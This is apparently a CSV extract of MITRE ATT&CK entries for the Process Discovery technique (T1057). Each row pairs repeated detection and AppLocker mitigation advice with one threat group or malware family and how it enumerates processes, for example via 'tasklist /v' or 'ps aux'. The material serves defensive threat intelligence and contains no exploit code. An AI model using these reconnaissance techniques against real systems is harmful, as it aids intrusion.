916,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to list processes.[[CiteRef::FireEye Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: gh0st,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
917,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] can obtain a process list from the victim.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
918,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0069|BLACKCOFFEE]] has the capability to discover processes.[[CiteRef::FireEye APT17]]'],['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: BLACKCOFFEE,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
919,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] collects current and parent process IDs.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Derusbi,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
920,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs process discovery using <code>tasklist</code> commands.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
921,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover processes running on a system.[[CiteRef::Microsoft Tasklist]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Tasklist,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
922,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] obtains a list of running processes on the victim.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: JHUHUGIT, Seduploader, ...",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
923,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] can list running processes.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: ADVSTORESHELL, NETUI, ...",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
924,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0161|XAgentOSX]] contains the getProcessList function to run <code>ps aux</code> to get running processes.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: XAgentOSX,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
925,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['The OsInfo function collects a running process list [[CiteRef::Sofacy Komplex Trojan]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Komplex,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
926,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0007|APT28]] has used built-in tools like <code>ps aux</code> on macOS to determine which processes are running [[CiteRef::XAgentOSX]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
927,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] can obtain information about process integrity levels.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: RTM,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
928,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0079|MobileOrder]] has a command to upload information about all running processes to its C2 server.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: MobileOrder,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
929,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover processes running on a system.[[CiteRef::Microsoft Tasklist]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Tasklist,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
930,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover running processes using the <code>tasklist /v</code> command.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
931,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0044|Winnti Group]] looked for a specific process running on infected servers.[[CiteRef::Kaspersky Winnti April 2013]]'],['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
932,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] has gathered a process list by using [[Software/S0057|Tasklist]].exe.[[CiteRef::F-Secure BlackEnergy 2014]][[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
933,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0031|BACKSPACE]] may collect information about running processes.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: BACKSPACE, Lecna",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
934,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0034|NETEAGLE]] can send process listings over the C2 channel.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 